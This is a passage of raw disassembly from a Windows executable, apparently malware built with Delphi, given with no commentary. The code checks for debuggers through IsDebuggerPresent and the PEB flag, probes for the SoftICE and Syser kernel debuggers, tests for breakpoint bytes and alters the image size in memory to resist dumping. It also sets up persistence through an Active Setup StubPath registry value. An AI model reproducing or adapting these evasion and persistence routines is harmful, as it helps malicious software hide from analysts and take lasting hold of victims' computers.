  407d2c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  407d30:	65 6c                	gs insb (%dx),%es:(%edi)
  407d32:	33 32                	xor    (%edx),%esi
  407d34:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  407d37:	6c                   	insb   (%dx),%es:(%edi)
  407d38:	00 00                	add    %al,(%eax)
  407d3a:	00 00                	add    %al,(%eax)
  407d3c:	49                   	dec    %ecx
  407d3d:	73 44                	jae    0x407d83
  407d3f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d43:	67 65 72 50          	addr16 gs jb 0x407d97
  407d47:	72 65                	jb     0x407dae
  407d49:	73 65                	jae    0x407db0
  407d4b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d4c:	74 00                	je     0x407d4e
  407d4e:	00 00                	add    %al,(%eax)
  407d50:	55                   	push   %ebp
  407d51:	8b ec                	mov    %esp,%ebp
  407d53:	83 c4 f8             	add    $0xfffffff8,%esp
  407d56:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  407d5d:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  407d61:	08 c0                	or     %al,%al
  407d63:	74 02                	je     0x407d67
  407d65:	75 07                	jne    0x407d6e
  407d67:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407d6e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  407d75:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
  407d79:	75 02                	jne    0x407d7d
  407d7b:	b2 01                	mov    $0x1,%dl
  407d7d:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  407d81:	75 02                	jne    0x407d85
  407d83:	33 d2                	xor    %edx,%edx
  407d85:	8b c2                	mov    %edx,%eax
  407d87:	59                   	pop    %ecx
  407d88:	59                   	pop    %ecx
  407d89:	5d                   	pop    %ebp
  407d8a:	c3                   	ret
  407d8b:	90                   	nop
  407d8c:	53                   	push   %ebx
  407d8d:	33 db                	xor    %ebx,%ebx
  407d8f:	e8 64 ff ff ff       	call   0x407cf8
  407d94:	3c 01                	cmp    $0x1,%al
  407d96:	74 09                	je     0x407da1
  407d98:	e8 b3 ff ff ff       	call   0x407d50
  407d9d:	3c 01                	cmp    $0x1,%al
  407d9f:	75 02                	jne    0x407da3
  407da1:	b3 01                	mov    $0x1,%bl
  407da3:	8b c3                	mov    %ebx,%eax
  407da5:	5b                   	pop    %ebx
  407da6:	c3                   	ret
  407da7:	90                   	nop
  407da8:	55                   	push   %ebp
  407da9:	8b ec                	mov    %esp,%ebp
  407dab:	6a 00                	push   $0x0
  407dad:	53                   	push   %ebx
  407dae:	33 c0                	xor    %eax,%eax
  407db0:	55                   	push   %ebp
  407db1:	68 fe 7d 40 00       	push   $0x407dfe
  407db6:	64 ff 30             	push   %fs:(%eax)
  407db9:	64 89 20             	mov    %esp,%fs:(%eax)
  407dbc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407dbf:	ba 14 7e 40 00       	mov    $0x407e14,%edx
  407dc4:	e8 1f ba ff ff       	call   0x4037e8
  407dc9:	6a 00                	push   $0x0
  407dcb:	ff 75 fc             	push   -0x4(%ebp)
  407dce:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  407dd5:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  407dd9:	08 c0                	or     %al,%al
  407ddb:	75 04                	jne    0x407de1
  407ddd:	31 c0                	xor    %eax,%eax
  407ddf:	c9                   	leave
  407de0:	c3                   	ret
  407de1:	b8 01 00 00 00       	mov    $0x1,%eax
  407de6:	c9                   	leave
  407de7:	c3                   	ret
  407de8:	33 c0                	xor    %eax,%eax
  407dea:	5a                   	pop    %edx
  407deb:	59                   	pop    %ecx
  407dec:	59                   	pop    %ecx
  407ded:	64 89 10             	mov    %edx,%fs:(%eax)
  407df0:	68 05 7e 40 00       	push   $0x407e05
  407df5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407df8:	e8 53 b9 ff ff       	call   0x403750
  407dfd:	c3                   	ret
  407dfe:	e9 c1 b3 ff ff       	jmp    0x4031c4
  407e03:	eb f0                	jmp    0x407df5
  407e05:	8b c3                	mov    %ebx,%eax
  407e07:	5b                   	pop    %ebx
  407e08:	59                   	pop    %ecx
  407e09:	5d                   	pop    %ebp
  407e0a:	c3                   	ret
  407e0b:	00 ff                	add    %bh,%bh
  407e0d:	ff                   	(bad)
  407e0e:	ff                   	(bad)
  407e0f:	ff 06                	incl   (%esi)
  407e11:	00 00                	add    %al,(%eax)
  407e13:	00 44 41 45          	add    %al,0x45(%ecx,%eax,2)
  407e17:	4d                   	dec    %ebp
  407e18:	4f                   	dec    %edi
  407e19:	4e                   	dec    %esi
  407e1a:	00 00                	add    %al,(%eax)
  407e1c:	55                   	push   %ebp
  407e1d:	8b ec                	mov    %esp,%ebp
  407e1f:	51                   	push   %ecx
  407e20:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407e23:	33 d2                	xor    %edx,%edx
  407e25:	8b 75 fc             	mov    -0x4(%ebp),%esi
  407e28:	8a 06                	mov    (%esi),%al
  407e2a:	3c cc                	cmp    $0xcc,%al
  407e2c:	74 04                	je     0x407e32
  407e2e:	31 c0                	xor    %eax,%eax
  407e30:	eb 05                	jmp    0x407e37
  407e32:	b8 01 00 00 00       	mov    $0x1,%eax
  407e37:	8b c2                	mov    %edx,%eax
  407e39:	59                   	pop    %ecx
  407e3a:	5d                   	pop    %ebp
  407e3b:	c3                   	ret
  407e3c:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  407e43:	8b 40 0c             	mov    0xc(%eax),%eax
  407e46:	8b 40 0c             	mov    0xc(%eax),%eax
  407e49:	81 40 20 00 20 00 00 	addl   $0x2000,0x20(%eax)
  407e50:	c3                   	ret
  407e51:	8d 40 00             	lea    0x0(%eax),%eax
  407e54:	53                   	push   %ebx
  407e55:	33 db                	xor    %ebx,%ebx
  407e57:	6a 00                	push   $0x0
  407e59:	68 80 00 00 00       	push   $0x80
  407e5e:	6a 03                	push   $0x3
  407e60:	6a 00                	push   $0x0
  407e62:	6a 03                	push   $0x3
  407e64:	68 00 00 00 c0       	push   $0xc0000000
  407e69:	50                   	push   %eax
  407e6a:	e8 f9 cc ff ff       	call   0x404b68
  407e6f:	83 f8 ff             	cmp    $0xffffffff,%eax
  407e72:	74 08                	je     0x407e7c
  407e74:	50                   	push   %eax
  407e75:	e8 ce cc ff ff       	call   0x404b48
  407e7a:	b3 01                	mov    $0x1,%bl
  407e7c:	8b c3                	mov    %ebx,%eax
  407e7e:	5b                   	pop    %ebx
  407e7f:	c3                   	ret
  407e80:	53                   	push   %ebx
  407e81:	33 db                	xor    %ebx,%ebx
  407e83:	b8 b4 7e 40 00       	mov    $0x407eb4,%eax
  407e88:	e8 c7 ff ff ff       	call   0x407e54
  407e8d:	84 c0                	test   %al,%al
  407e8f:	75 1c                	jne    0x407ead
  407e91:	b8 c0 7e 40 00       	mov    $0x407ec0,%eax
  407e96:	e8 b9 ff ff ff       	call   0x407e54
  407e9b:	84 c0                	test   %al,%al
  407e9d:	75 0e                	jne    0x407ead
  407e9f:	b8 d0 7e 40 00       	mov    $0x407ed0,%eax
  407ea4:	e8 ab ff ff ff       	call   0x407e54
  407ea9:	84 c0                	test   %al,%al
  407eab:	74 02                	je     0x407eaf
  407ead:	b3 01                	mov    $0x1,%bl
  407eaf:	8b c3                	mov    %ebx,%eax
  407eb1:	5b                   	pop    %ebx
  407eb2:	c3                   	ret
  407eb3:	00 5c 5c 2e          	add    %bl,0x2e(%esp,%ebx,2)
  407eb7:	5c                   	pop    %esp
  407eb8:	53                   	push   %ebx
  407eb9:	79 73                	jns    0x407f2e
  407ebb:	65 72 00             	gs jb  0x407ebe
  407ebe:	00 00                	add    %al,(%eax)
  407ec0:	5c                   	pop    %esp
  407ec1:	5c                   	pop    %esp
  407ec2:	2e 5c                	cs pop %esp
  407ec4:	53                   	push   %ebx
  407ec5:	79 73                	jns    0x407f3a
  407ec7:	65 72 44             	gs jb  0x407f0e
  407eca:	62 67 4d             	bound  %esp,0x4d(%edi)
  407ecd:	73 67                	jae    0x407f36
  407ecf:	00 5c 5c 2e          	add    %bl,0x2e(%esp,%ebx,2)
  407ed3:	5c                   	pop    %esp
  407ed4:	53                   	push   %ebx
  407ed5:	79 73                	jns    0x407f4a
  407ed7:	65 72 42             	gs jb  0x407f1c
  407eda:	6f                   	outsl  %ds:(%esi),(%dx)
  407edb:	6f                   	outsl  %ds:(%esi),(%dx)
  407edc:	74 00                	je     0x407ede
  407ede:	00 00                	add    %al,(%eax)
  407ee0:	53                   	push   %ebx
  407ee1:	33 db                	xor    %ebx,%ebx
  407ee3:	6a 00                	push   $0x0
  407ee5:	68 80 00 00 00       	push   $0x80
  407eea:	6a 03                	push   $0x3
  407eec:	6a 00                	push   $0x0
  407eee:	6a 03                	push   $0x3
  407ef0:	68 00 00 00 c0       	push   $0xc0000000
  407ef5:	68 10 7f 40 00       	push   $0x407f10
  407efa:	e8 69 cc ff ff       	call   0x404b68
  407eff:	83 f8 ff             	cmp    $0xffffffff,%eax
  407f02:	74 08                	je     0x407f0c
  407f04:	50                   	push   %eax
  407f05:	e8 3e cc ff ff       	call   0x404b48
  407f0a:	b3 01                	mov    $0x1,%bl
  407f0c:	8b c3                	mov    %ebx,%eax
  407f0e:	5b                   	pop    %ebx
  407f0f:	c3                   	ret
  407f10:	5c                   	pop    %esp
  407f11:	5c                   	pop    %esp
  407f12:	2e 5c                	cs pop %esp
  407f14:	53                   	push   %ebx
  407f15:	49                   	dec    %ecx
  407f16:	43                   	inc    %ebx
  407f17:	45                   	inc    %ebp
  407f18:	00 00                	add    %al,(%eax)
  407f1a:	00 00                	add    %al,(%eax)
  407f1c:	53                   	push   %ebx
  407f1d:	33 db                	xor    %ebx,%ebx
  407f1f:	6a 00                	push   $0x0
  407f21:	68 80 00 00 00       	push   $0x80
  407f26:	6a 03                	push   $0x3
  407f28:	6a 00                	push   $0x0
  407f2a:	6a 03                	push   $0x3
  407f2c:	68 00 00 00 c0       	push   $0xc0000000
  407f31:	68 4c 7f 40 00       	push   $0x407f4c
  407f36:	e8 2d cc ff ff       	call   0x404b68
  407f3b:	83 f8 ff             	cmp    $0xffffffff,%eax
  407f3e:	74 08                	je     0x407f48
  407f40:	50                   	push   %eax
  407f41:	e8 02 cc ff ff       	call   0x404b48
  407f46:	b3 01                	mov    $0x1,%bl
  407f48:	8b c3                	mov    %ebx,%eax
  407f4a:	5b                   	pop    %ebx
  407f4b:	c3                   	ret
  407f4c:	5c                   	pop    %esp
  407f4d:	5c                   	pop    %esp
  407f4e:	2e 5c                	cs pop %esp
  407f50:	4e                   	dec    %esi
  407f51:	54                   	push   %esp
  407f52:	49                   	dec    %ecx
  407f53:	43                   	inc    %ebx
  407f54:	45                   	inc    %ebp
  407f55:	00 00                	add    %al,(%eax)
  407f57:	00 53 33             	add    %dl,0x33(%ebx)
  407f5a:	db e8                	fucomi %st(0),%st
  407f5c:	80 ff ff             	cmp    $0xff,%bh
  407f5f:	ff                   	(bad)
  407f60:	3c 01                	cmp    $0x1,%al
  407f62:	74 09                	je     0x407f6d
  407f64:	e8 b3 ff ff ff       	call   0x407f1c
  407f69:	3c 01                	cmp    $0x1,%al
  407f6b:	75 02                	jne    0x407f6f
  407f6d:	b3 01                	mov    $0x1,%bl
  407f6f:	8b c3                	mov    %ebx,%eax
  407f71:	5b                   	pop    %ebx
  407f72:	c3                   	ret
  407f73:	90                   	nop
  407f74:	55                   	push   %ebp
  407f75:	8b ec                	mov    %esp,%ebp
  407f77:	33 c0                	xor    %eax,%eax
  407f79:	55                   	push   %ebp
  407f7a:	68 99 7f 40 00       	push   $0x407f99
  407f7f:	64 ff 30             	push   %fs:(%eax)
  407f82:	64 89 20             	mov    %esp,%fs:(%eax)
  407f85:	ff 05 74 b9 40 00    	incl   0x40b974
  407f8b:	33 c0                	xor    %eax,%eax
  407f8d:	5a                   	pop    %edx
  407f8e:	59                   	pop    %ecx
  407f8f:	59                   	pop    %ecx
  407f90:	64 89 10             	mov    %edx,%fs:(%eax)
  407f93:	68 a0 7f 40 00       	push   $0x407fa0
  407f98:	c3                   	ret
  407f99:	e9 26 b2 ff ff       	jmp    0x4031c4
  407f9e:	eb f8                	jmp    0x407f98
  407fa0:	5d                   	pop    %ebp
  407fa1:	c3                   	ret
  407fa2:	8b c0                	mov    %eax,%eax
  407fa4:	83 2d 74 b9 40 00 01 	subl   $0x1,0x40b974
  407fab:	c3                   	ret
  407fac:	f8                   	clc
  407fad:	7f 40                	jg     0x407fef
	...
  407fcb:	00 f8                	add    %bh,%al
  407fcd:	7f 40                	jg     0x40800f
  407fcf:	00 04 00             	add    %al,(%eax,%eax,1)
  407fd2:	00 00                	add    %al,(%eax)
  407fd4:	0c 10                	or     $0x10,%al
  407fd6:	40                   	inc    %eax
  407fd7:	00 f4                	add    %dh,%ah
  407fd9:	2e 40                	cs inc %eax
  407fdb:	00 00                	add    %al,(%eax)
  407fdd:	2f                   	das
  407fde:	40                   	inc    %eax
  407fdf:	00 04 2f             	add    %al,(%edi,%ebp,1)
  407fe2:	40                   	inc    %eax
  407fe3:	00 08                	add    %cl,(%eax)
  407fe5:	2f                   	das
  407fe6:	40                   	inc    %eax
  407fe7:	00 fc                	add    %bh,%ah
  407fe9:	2e 40                	cs inc %eax
  407feb:	00 d8                	add    %bl,%al
  407fed:	2d 40 00 f4 2d       	sub    $0x2df40040,%eax
  407ff2:	40                   	inc    %eax
  407ff3:	00 30                	add    %dh,(%eax)
  407ff5:	2e 40                	cs inc %eax
  407ff7:	00 0b                	add    %cl,(%ebx)
  407ff9:	54                   	push   %esp
  407ffa:	43                   	inc    %ebx
  407ffb:	41                   	inc    %ecx
  407ffc:	75 74                	jne    0x408072
  407ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fff:	73 74                	jae    0x408075
  408001:	61                   	popa
  408002:	72 74                	jb     0x408078
  408004:	53                   	push   %ebx
  408005:	56                   	push   %esi
  408006:	84 d2                	test   %dl,%dl
  408008:	74 08                	je     0x408012
  40800a:	83 c4 f0             	add    $0xfffffff0,%esp
  40800d:	e8 1e af ff ff       	call   0x402f30
  408012:	8b da                	mov    %edx,%ebx
  408014:	8b f0                	mov    %eax,%esi
  408016:	33 d2                	xor    %edx,%edx
  408018:	8b c6                	mov    %esi,%eax
  40801a:	e8 f1 ad ff ff       	call   0x402e10
  40801f:	8b c6                	mov    %esi,%eax
  408021:	84 db                	test   %bl,%bl
  408023:	74 0f                	je     0x408034
  408025:	e8 5e af ff ff       	call   0x402f88
  40802a:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  408031:	83 c4 0c             	add    $0xc,%esp
  408034:	8b c6                	mov    %esi,%eax
  408036:	5e                   	pop    %esi
  408037:	5b                   	pop    %ebx
  408038:	c3                   	ret
  408039:	8d 40 00             	lea    0x0(%eax),%eax
  40803c:	53                   	push   %ebx
  40803d:	56                   	push   %esi
  40803e:	e8 55 af ff ff       	call   0x402f98
  408043:	8b da                	mov    %edx,%ebx
  408045:	8b f0                	mov    %eax,%esi
  408047:	8b d3                	mov    %ebx,%edx
  408049:	80 e2 fc             	and    $0xfc,%dl
  40804c:	8b c6                	mov    %esi,%eax
  40804e:	e8 dd ad ff ff       	call   0x402e30
  408053:	84 db                	test   %bl,%bl
  408055:	7e 07                	jle    0x40805e
  408057:	8b c6                	mov    %esi,%eax
  408059:	e8 22 af ff ff       	call   0x402f80
  40805e:	5e                   	pop    %esi
  40805f:	5b                   	pop    %ebx
  408060:	c3                   	ret
  408061:	8d 40 00             	lea    0x0(%eax),%eax
  408064:	ff                   	(bad)
  408065:	ff                   	(bad)
  408066:	ff                   	(bad)
  408067:	ff 09                	decl   (%ecx)
  408069:	00 00                	add    %al,(%eax)
  40806b:	00 20                	add    %ah,(%eax)
  40806d:	52                   	push   %edx
  40806e:	65 73 74             	gs jae 0x4080e5
  408071:	61                   	popa
  408072:	72 74                	jb     0x4080e8
  408074:	00 00                	add    %al,(%eax)
  408076:	00 00                	add    %al,(%eax)
  408078:	55                   	push   %ebp
  408079:	8b ec                	mov    %esp,%ebp
  40807b:	6a 00                	push   $0x0
  40807d:	6a 00                	push   $0x0
  40807f:	6a 00                	push   $0x0
  408081:	6a 00                	push   $0x0
  408083:	6a 00                	push   $0x0
  408085:	53                   	push   %ebx
  408086:	56                   	push   %esi
  408087:	8b d9                	mov    %ecx,%ebx
  408089:	8b f2                	mov    %edx,%esi
  40808b:	33 c0                	xor    %eax,%eax
  40808d:	55                   	push   %ebp
  40808e:	68 4e 81 40 00       	push   $0x40814e
  408093:	64 ff 30             	push   %fs:(%eax)
  408096:	64 89 20             	mov    %esp,%fs:(%eax)
  408099:	6a 00                	push   $0x0
  40809b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40809e:	50                   	push   %eax
  40809f:	6a 00                	push   $0x0
  4080a1:	6a 02                	push   $0x2
  4080a3:	6a 00                	push   $0x0
  4080a5:	6a 00                	push   $0x0
  4080a7:	6a 00                	push   $0x0
  4080a9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4080ac:	8b d6                	mov    %esi,%edx
  4080ae:	e8 bd b7 ff ff       	call   0x403870
  4080b3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4080b6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4080b9:	ba 64 81 40 00       	mov    $0x408164,%edx
  4080be:	e8 4d b8 ff ff       	call   0x403910
  4080c3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4080c6:	e8 f9 b9 ff ff       	call   0x403ac4
  4080cb:	50                   	push   %eax
  4080cc:	68 02 00 00 80       	push   $0x80000002
  4080d1:	e8 4a ca ff ff       	call   0x404b20
  4080d6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4080d9:	8b d3                	mov    %ebx,%edx
  4080db:	e8 90 b7 ff ff       	call   0x403870
  4080e0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4080e3:	e8 dc b7 ff ff       	call   0x4038c4
  4080e8:	8b f0                	mov    %eax,%esi
  4080ea:	a1 ac a0 40 00       	mov    0x40a0ac,%eax
  4080ef:	e8 d0 b7 ff ff       	call   0x4038c4
  4080f4:	03 f0                	add    %eax,%esi
  4080f6:	56                   	push   %esi
  4080f7:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4080fa:	8b d3                	mov    %ebx,%edx
  4080fc:	e8 6f b7 ff ff       	call   0x403870
  408101:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408104:	8b 15 ac a0 40 00    	mov    0x40a0ac,%edx
  40810a:	e8 bd b7 ff ff       	call   0x4038cc
  40810f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408112:	e8 ad b9 ff ff       	call   0x403ac4
  408117:	50                   	push   %eax
  408118:	6a 01                	push   $0x1
  40811a:	6a 00                	push   $0x0
  40811c:	68 9c 81 40 00       	push   $0x40819c
  408121:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408124:	50                   	push   %eax
  408125:	e8 16 ca ff ff       	call   0x404b40
  40812a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40812d:	50                   	push   %eax
  40812e:	e8 dd c9 ff ff       	call   0x404b10
  408133:	33 c0                	xor    %eax,%eax
  408135:	5a                   	pop    %edx
  408136:	59                   	pop    %ecx
  408137:	59                   	pop    %ecx
  408138:	64 89 10             	mov    %edx,%fs:(%eax)
  40813b:	68 55 81 40 00       	push   $0x408155
  408140:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408143:	ba 04 00 00 00       	mov    $0x4,%edx
  408148:	e8 27 b6 ff ff       	call   0x403774
  40814d:	c3                   	ret
  40814e:	e9 71 b0 ff ff       	jmp    0x4031c4
  408153:	eb eb                	jmp    0x408140
  408155:	5e                   	pop    %esi
  408156:	5b                   	pop    %ebx
  408157:	8b e5                	mov    %ebp,%esp
  408159:	5d                   	pop    %ebp
  40815a:	c3                   	ret
  40815b:	00 ff                	add    %bh,%bh
  40815d:	ff                   	(bad)
  40815e:	ff                   	(bad)
  40815f:	ff 35 00 00 00 53    	push   0x53000000
  408165:	6f                   	outsl  %ds:(%esi),(%dx)
  408166:	66 74 77             	data16 je 0x4081e0
  408169:	61                   	popa
  40816a:	72 65                	jb     0x4081d1
  40816c:	5c                   	pop    %esp
  40816d:	4d                   	dec    %ebp
  40816e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408175:	74 5c                	je     0x4081d3
  408177:	41                   	inc    %ecx
  408178:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40817c:	65 20 53 65          	and    %dl,%gs:0x65(%ebx)
  408180:	74 75                	je     0x4081f7
  408182:	70 5c                	jo     0x4081e0
  408184:	49                   	dec    %ecx
  408185:	6e                   	outsb  %ds:(%esi),(%dx)
  408186:	73 74                	jae    0x4081fc
  408188:	61                   	popa
  408189:	6c                   	insb   (%dx),%es:(%edi)
  40818a:	6c                   	insb   (%dx),%es:(%edi)
  40818b:	65 64 20 43 6f       	gs and %al,%fs:0x6f(%ebx)
  408190:	6d                   	insl   (%dx),%es:(%edi)
  408191:	70 6f                	jo     0x408202
  408193:	6e                   	outsb  %ds:(%esi),(%dx)
  408194:	65 6e                	outsb  %gs:(%esi),(%dx)
  408196:	74 73                	je     0x40820b
  408198:	5c                   	pop    %esp
  408199:	00 00                	add    %al,(%eax)
  40819b:	00 53 74             	add    %dl,0x74(%ebx)
  40819e:	75 62                	jne    0x408202
  4081a0:	50                   	push   %eax
  4081a1:	61                   	popa
  4081a2:	74 68                	je     0x40820c
  4081a4:	00 00                	add    %al,(%eax)
  4081a6:	00 00                	add    %al,(%eax)
  4081a8:	53                   	push   %ebx
  4081a9:	51                   	push   %ecx
  4081aa:	8b da                	mov    %edx,%ebx
  4081ac:	54                   	push   %esp
  4081ad:	68 06 00 02 00       	push   $0x20006
  4081b2:	6a 00                	push   $0x0
  4081b4:	68 dc 81 40 00       	push   $0x4081dc
  4081b9:	68 01 00 00 80       	push   $0x80000001
  4081be:	e8 6d c9 ff ff       	call   0x404b30
  4081c3:	53                   	push   %ebx
  4081c4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4081c8:	50                   	push   %eax
  4081c9:	e8 5a c9 ff ff       	call   0x404b28
  4081ce:	8b 04 24             	mov    (%esp),%eax
  4081d1:	50                   	push   %eax
  4081d2:	e8 39 c9 ff ff       	call   0x404b10
  4081d7:	5a                   	pop    %edx
  4081d8:	5b                   	pop    %ebx
  4081d9:	c3                   	ret
  4081da:	00 00                	add    %al,(%eax)
  4081dc:	53                   	push   %ebx
  4081dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081de:	66 74 77             	data16 je 0x408258
  4081e1:	61                   	popa
  4081e2:	72 65                	jb     0x408249
  4081e4:	5c                   	pop    %esp
  4081e5:	4d                   	dec    %ebp
  4081e6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4081ed:	74 5c                	je     0x40824b
  4081ef:	41                   	inc    %ecx
  4081f0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4081f4:	65 20 53 65          	and    %dl,%gs:0x65(%ebx)
  4081f8:	74 75                	je     0x40826f
  4081fa:	70 5c                	jo     0x408258
  4081fc:	49                   	dec    %ecx
  4081fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fe:	73 74                	jae    0x408274
  408200:	61                   	popa
  408201:	6c                   	insb   (%dx),%es:(%edi)
  408202:	6c                   	insb   (%dx),%es:(%edi)
  408203:	65 64 20 43 6f       	gs and %al,%fs:0x6f(%ebx)
  408208:	6d                   	insl   (%dx),%es:(%edi)
  408209:	70 6f                	jo     0x40827a
  40820b:	6e                   	outsb  %ds:(%esi),(%dx)
  40820c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40820e:	74 73                	je     0x408283
  408210:	5c                   	pop    %esp
  408211:	00 00                	add    %al,(%eax)
  408213:	00 55 8b             	add    %dl,-0x75(%ebp)
  408216:	ec                   	in     (%dx),%al
  408217:	6a 00                	push   $0x0
  408219:	53                   	push   %ebx
  40821a:	56                   	push   %esi
  40821b:	57                   	push   %edi
  40821c:	8b f9                	mov    %ecx,%edi
  40821e:	8b f2                	mov    %edx,%esi
  408220:	8b d8                	mov    %eax,%ebx
  408222:	33 c0                	xor    %eax,%eax
  408224:	55                   	push   %ebp
  408225:	68 82 82 40 00       	push   $0x408282
  40822a:	64 ff 30             	push   %fs:(%eax)
  40822d:	64 89 20             	mov    %esp,%fs:(%eax)
  408230:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408233:	b8 01 00 00 00       	mov    $0x1,%eax
  408238:	e8 a7 a8 ff ff       	call   0x402ae4
  40823d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408240:	ba 98 82 40 00       	mov    $0x408298,%edx
  408245:	e8 c6 b7 ff ff       	call   0x403a10
  40824a:	75 20                	jne    0x40826c
  40824c:	57                   	push   %edi
  40824d:	6a 00                	push   $0x0
  40824f:	6a 05                	push   $0x5
  408251:	8b ce                	mov    %esi,%ecx
  408253:	33 d2                	xor    %edx,%edx
  408255:	33 c0                	xor    %eax,%eax
  408257:	e8 5c de ff ff       	call   0x4060b8
  40825c:	b2 01                	mov    $0x1,%dl
  40825e:	8b c3                	mov    %ebx,%eax
  408260:	e8 d7 fd ff ff       	call   0x40803c
  408265:	6a 00                	push   $0x0
  408267:	e8 44 c9 ff ff       	call   0x404bb0
  40826c:	33 c0                	xor    %eax,%eax
  40826e:	5a                   	pop    %edx
  40826f:	59                   	pop    %ecx
  408270:	59                   	pop    %ecx
  408271:	64 89 10             	mov    %edx,%fs:(%eax)
  408274:	68 89 82 40 00       	push   $0x408289
  408279:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40827c:	e8 cf b4 ff ff       	call   0x403750
  408281:	c3                   	ret
  408282:	e9 3d af ff ff       	jmp    0x4031c4
  408287:	eb f0                	jmp    0x408279
  408289:	5f                   	pop    %edi
  40828a:	5e                   	pop    %esi
  40828b:	5b                   	pop    %ebx
  40828c:	59                   	pop    %ecx
  40828d:	5d                   	pop    %ebp
  40828e:	c3                   	ret
  40828f:	00 ff                	add    %bh,%bh
  408291:	ff                   	(bad)
  408292:	ff                   	(bad)
  408293:	ff 07                	incl   (%edi)
  408295:	00 00                	add    %al,(%eax)
  408297:	00 52 65             	add    %dl,0x65(%edx)
  40829a:	73 74                	jae    0x408310
  40829c:	61                   	popa
  40829d:	72 74                	jb     0x408313
  40829f:	00 55 8b             	add    %dl,-0x75(%ebp)
  4082a2:	ec                   	in     (%dx),%al
  4082a3:	53                   	push   %ebx
  4082a4:	56                   	push   %esi
  4082a5:	57                   	push   %edi
  4082a6:	8b f9                	mov    %ecx,%edi
  4082a8:	8b f2                	mov    %edx,%esi
  4082aa:	8b d8                	mov    %eax,%ebx
  4082ac:	8b d6                	mov    %esi,%edx
  4082ae:	8b c3                	mov    %ebx,%eax
  4082b0:	e8 f3 fe ff ff       	call   0x4081a8
  4082b5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4082b8:	8b d7                	mov    %edi,%edx
  4082ba:	8b c3                	mov    %ebx,%eax
  4082bc:	e8 53 ff ff ff       	call   0x408214
  4082c1:	8b cf                	mov    %edi,%ecx
  4082c3:	8b d6                	mov    %esi,%edx
  4082c5:	8b c3                	mov    %ebx,%eax
  4082c7:	e8 ac fd ff ff       	call   0x408078
  4082cc:	5f                   	pop    %edi
  4082cd:	5e                   	pop    %esi
  4082ce:	5b                   	pop    %ebx
  4082cf:	5d                   	pop    %ebp
  4082d0:	c2 04 00             	ret    $0x4
  4082d3:	90                   	nop
  4082d4:	55                   	push   %ebp
  4082d5:	8b ec                	mov    %esp,%ebp
  4082d7:	33 c0                	xor    %eax,%eax
  4082d9:	55                   	push   %ebp
  4082da:	68 05 83 40 00       	push   $0x408305
  4082df:	64 ff 30             	push   %fs:(%eax)
  4082e2:	64 89 20             	mov    %esp,%fs:(%eax)
  4082e5:	ff 05 78 b9 40 00    	incl   0x40b978
  4082eb:	75 0a                	jne    0x4082f7
  4082ed:	b8 ac a0 40 00       	mov    $0x40a0ac,%eax
  4082f2:	e8 59 b4 ff ff       	call   0x403750
  4082f7:	33 c0                	xor    %eax,%eax
  4082f9:	5a                   	pop    %edx
  4082fa:	59                   	pop    %ecx
  4082fb:	59                   	pop    %ecx
  4082fc:	64 89 10             	mov    %edx,%fs:(%eax)
  4082ff:	68 0c 83 40 00       	push   $0x40830c
  408304:	c3                   	ret
  408305:	e9 ba ae ff ff       	jmp    0x4031c4
  40830a:	eb f8                	jmp    0x408304
  40830c:	5d                   	pop    %ebp
  40830d:	c3                   	ret
  40830e:	8b c0                	mov    %eax,%eax
  408310:	83 2d 78 b9 40 00 01 	subl   $0x1,0x40b978
  408317:	c3                   	ret
  408318:	55                   	push   %ebp
  408319:	8b ec                	mov    %esp,%ebp
  40831b:	b9 0f 00 00 00       	mov    $0xf,%ecx
  408320:	6a 00                	push   $0x0
  408322:	6a 00                	push   $0x0
  408324:	49                   	dec    %ecx
  408325:	75 f9                	jne    0x408320
  408327:	51                   	push   %ecx
  408328:	53                   	push   %ebx
  408329:	56                   	push   %esi
  40832a:	57                   	push   %edi
  40832b:	8b da                	mov    %edx,%ebx
  40832d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408330:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408333:	e8 7c b7 ff ff       	call   0x403ab4
  408338:	33 c0                	xor    %eax,%eax
  40833a:	55                   	push   %ebp
  40833b:	68 25 88 40 00       	push   $0x408825
  408340:	64 ff 30             	push   %fs:(%eax)
